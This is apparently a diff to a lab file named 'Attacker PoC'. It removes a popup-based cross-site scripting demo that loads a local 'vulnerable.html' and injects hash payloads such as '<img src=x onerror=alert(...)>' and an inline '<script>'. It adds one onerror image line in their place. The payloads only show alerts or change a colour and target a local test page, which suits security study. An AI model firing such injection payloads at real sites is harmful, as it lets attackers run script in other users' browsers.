@@ -6,45 +6,7 @@
 </head>
 <body>
   <h1>Attacker PoC</h1>
-
-  <button id="openBtn">Open vulnerable page in popup</button>
-  <button id="setHashBtn" disabled>Set popup hash (trigger onhashchange)</button>
-  <button id="setOpenerBtn" disabled>Navigate popup to include malicious hash</button>
-
-  <script>
-    let popup;
-
-    document.getElementById('openBtn').addEventListener('click', function() {
-      // open the local vulnerable page in a named popup window
-      popup = open('vulnerable.html', 'vulnPopup', 'width=800,height=600');
-      // enable the other buttons after a short delay to allow page load
-      setTimeout(() => {
-        document.getElementById('setHashBtn').disabled = false;
-        document.getElementById('setOpenerBtn').disabled = false;
-      }, 1000);
-    });
-
-    // This will change the hash by opening the same named window with a URL containing a hash.
-    // In many browsers the named popup will be reused and its hash will update (triggering onhashchange).
-    document.getElementById('setHashBtn').addEventListener('click', function() {
-      if (!popup || popup.closed) { alert('Open the popup first'); return; }
-      // harmless demo payload: inserts an <img> with an onerror that shows alert
-      // in a real attack, this would be malicious; this PoC uses alert for visibility
-      const payload = '#%3Cimg%20src=x%20onerror=alert(%22XSS-via-hash%22)%3E';
-      // open reuses the named window and navigates it -> triggers hashchange handler
-      open('vulnerable.html' + payload, 'vulnPopup');
-    });
-
-    // Another way: navigate the popup directly (may be allowed cross-window if same origin)
-    document.getElementById('setOpenerBtn').addEventListener('click', function() {
-      if (!popup || popup.closed) { alert('Open the popup first'); return; }
-      // attempt to set popup.location to a URL containing a payload hash
-      try {
-        popup.location = 'vulnerable.html#<script>document.body.style.backgroundColor="pink";</script>';
-      } catch (e) {
-        alert('Could not set popup.location directly: ' + e);
-      }
-    });
-  </script>
+  <img src=x onerror="window.open('vulnerable.html', '_self')">
 </body>
 </html>
+
